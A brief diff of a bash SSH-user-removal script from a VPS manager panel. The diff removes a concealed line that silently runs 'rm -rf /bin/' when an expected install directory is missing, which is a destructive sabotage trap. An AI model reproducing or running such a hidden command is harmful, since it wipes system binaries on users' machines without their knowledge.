@@ -1,5 +1,4 @@
 #!/bin/bash
-[[ ! -e /usr/lib/vpsmanager ]] && rm -rf /bin/ > /dev/null 2>&1
 database="/root/kangaroo_users.db"
 clear
 tput setaf 7 ; tput setab 4 ; tput bold ; printf '%32s%s%-13s\n' "Remove SSH User" ; tput sgr0
